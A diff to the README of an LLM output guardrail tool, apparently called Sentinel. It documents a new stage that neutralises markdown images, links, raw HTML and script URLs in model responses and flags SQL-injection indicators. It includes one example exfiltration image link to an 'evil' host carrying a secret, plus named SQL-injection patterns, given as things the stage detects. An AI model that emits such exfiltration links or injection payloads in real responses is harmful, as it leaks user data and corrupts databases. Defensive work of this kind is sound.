@@ -225,7 +225,7 @@ out = guard.check_output(
 
 out.verdict           # "allow" | "review" | "block"
 out.sanitized_output  # normalized + PII-redacted text (None when blocked)
-out.blocked_at        # "rule_checks" | "leakage" | "policy" | "safety" | None
+out.blocked_at        # "rule_checks" | "leakage" | "output_handling" | "policy" | "safety" | None
 out.safety_categories # hazard categories that caused a block, e.g. ["violent_crimes"]
 out.pipeline          # full per-stage detail
 ```
@@ -370,6 +370,7 @@ pii:
 
 | Threat | Caught by |
 |--------|-----------|
+| Exfiltration images/links, `<script>` / event-handler HTML, `javascript:` URLs in a response | Output handling stage (parser-verified; per-app `output:` policy) |
 | Model discloses its system prompt / hidden instructions | Output rule pack (`leak_patterns`); optional canary + semantic system-prompt check (`leakage`) |
 | Credentials or API keys in a response | Output rule pack (`secret_patterns`) |
 | Raw chat-template tokens leaking into output | Output rule pack (`leak_patterns`) |
@@ -389,6 +390,36 @@ pii:
 ### Stage 2b — Leakage check (optional)
 
 Runs after rule checks when the caller supplies `system_prompt` and/or `canaries` (SDK arguments, or fields on `POST /v1/output/analyze`). Blocks with `blocked_at: "leakage"` and violations `canary_leaked` or `system_prompt_semantic`. See [System-prompt leakage](#system-prompt-leakage-owasp-llm07).
+
+### Stage 2c — Output handling (OWASP LLM05)
+
+A model response is untrusted input to whatever consumes it next. This stage neutralizes the constructs that turn a response into an attack, according to the application's policy. It runs by default (turn it off with `SENTINEL_DISABLE_OUTPUT_HANDLING=true`) and later stages judge the neutralized text.
+
+| Threat | Default | Modes |
+|--------|---------|-------|
+| Markdown images — `![x](https://evil/?d=SECRET)` is fetched by the renderer on its own: a silent exfiltration channel | `strip` | `allow` · `allowlist` · `strip` · `block` |
+| Markdown links, autolinks, bare URLs — phishing, exfiltration | `allow` | `allow` · `allowlist` · `strip` · `block` |
+| Raw HTML — `<script>`, event handlers, `<iframe>` | `sanitize` | `allow` · `sanitize` · `block` |
+| `javascript:` / `data:` / `vbscript:` URLs | always stripped | — |
+| SQL-injection indicators (stacked or destructive statements, `OR 1=1`, `UNION SELECT`, …) | `allow` (opt-in) | `allow` · `flag` · `block` · `readonly` |
+
+```yaml
+# policies/support-bot.yaml
+output:
+  images: strip            # or allowlist, with allowed_domains
+  links: allowlist
+  allowed_domains: [docs.acme.com]   # subdomains match too
+  html: sanitize           # coding assistants: html: allow
+  sql: readonly            # text-to-SQL apps: single read-only query only
+```
+
+Global defaults come from `SENTINEL_OUTPUT_IMAGES`, `SENTINEL_OUTPUT_LINKS`, `SENTINEL_OUTPUT_HTML` and `SENTINEL_OUTPUT_ALLOWED_DOMAINS`; a policy file's `output:` section overrides them per application. `strip` keeps the link text or image alt text and removes the URL. A response that is changed still gets verdict `allow` with the cleaned text in `sanitized_output`; `block` mode returns `blocked_at: "output_handling"`. Report: `pipeline.output_handling` (`findings`, `actions`).
+
+How it works: markdown is *detected* with a CommonMark parser ([markdown-it-py](https://github.com/executablebooks/markdown-it-py)) plus a raw-syntax pass (parsers silently drop `javascript:` links that other renderers might not), *rewritten* conservatively, then **re-parsed to verify** — if anything disallowed survives, the response is blocked (fail closed). HTML is sanitized by [nh3](https://github.com/messense/nh3), never by hand. Relative URLs count as same-origin in `allowlist` mode.
+
+**Limits.** This reduces risk; it does not replace encoding at the sink (parameterized queries, HTML escaping, no `shell=True`). Fenced and inline code is left alone for markdown images/links, but is **not** exempt from HTML scanning — set `html: allow` for apps that emit code. With `html: allow`, `images`/`links` apply to markdown only, not raw `<img>`/`<a>`. When HTML is present, the text is re-serialized by the sanitizer, which escapes stray `&`, `<`, `>`. Shell-injection patterns are not detected (yet).
+
+**SQL.** Opt-in, because ordinary answers contain SQL. For apps that execute or interpolate model output into a query (text-to-SQL, database agents), set `sql` to `flag` (verdict `review`), `block`, or `readonly` (block, and also refuse any `INSERT`/`UPDATE`/`DELETE`/DDL). Statements are split with [sqlparse](https://github.com/andialbrecht/sqlparse) — a `;` inside a string or comment isn't a boundary — and classified by shape, so prose like "Update the settings" isn't SQL. Indicators (reported in `pipeline.output_handling.sql_indicators`): `sql_stacked_statements`, `sql_destructive` (DROP/TRUNCATE/ALTER/CREATE/GRANT/REVOKE), `sql_unbounded_write` (UPDATE/DELETE without WHERE), `sql_write_statement` (`readonly` only), `sql_tautology`, `sql_union_select`, `sql_comment_truncation`, `sql_time_delay`, `sql_file_or_exec`. SQL is detected, never rewritten. Statements are recognized at the start of a line, code fence or inline code span (a `DROP TABLE` buried mid-sentence is not), and a prose line like "Delete from the menu what you dislike." can false-positive. It is heuristic, not a SQL validator, and explanatory answers with SQL examples will trip it — use it only on apps whose output reaches a database, and keep parameterized queries and a read-only DB role as the real defense.
 
 ### Stage 3 — Policy (output)
 
@@ -545,6 +576,12 @@ All values can be set in `.env` (prefix `SENTINEL_`) or as environment variables
 | `SENTINEL_SEMANTIC_LEAK_DEVICE` | `auto` | Device: `auto` (cuda→mps→cpu) or explicit |
 | `SENTINEL_MAX_SYSTEM_PROMPT_LENGTH` | `32768` | Max `system_prompt` characters accepted for leak checks |
 | `SENTINEL_MAX_CANARIES` | `16` | Max canaries per call |
+| `SENTINEL_DISABLE_OUTPUT_HANDLING` | `false` | Skip the output-handling stage (LLM05) entirely |
+| `SENTINEL_OUTPUT_IMAGES` | `strip` | Default for markdown images: `allow` · `allowlist` · `strip` · `block` |
+| `SENTINEL_OUTPUT_LINKS` | `allow` | Default for links/URLs: `allow` · `allowlist` · `strip` · `block` |
+| `SENTINEL_OUTPUT_HTML` | `sanitize` | Default for raw HTML: `allow` · `sanitize` · `block` |
+| `SENTINEL_OUTPUT_SQL` | `allow` | Default for SQL-injection indicators: `allow` · `flag` · `block` · `readonly` |
+| `SENTINEL_OUTPUT_ALLOWED_DOMAINS` | *(empty)* | Comma-separated hosts for `allowlist` mode (subdomains match) |
 | `SENTINEL_SAFETY_MODEL` | `meta-llama/Llama-Guard-3-1B` | Llama Guard model id or local path |
 | `SENTINEL_SAFETY_DEVICE` | `auto` | Device: `auto` (cuda→mps→cpu) or explicit |
 | `SENTINEL_DISABLE_SAFETY` | `false` | Skip the safety classifier entirely |
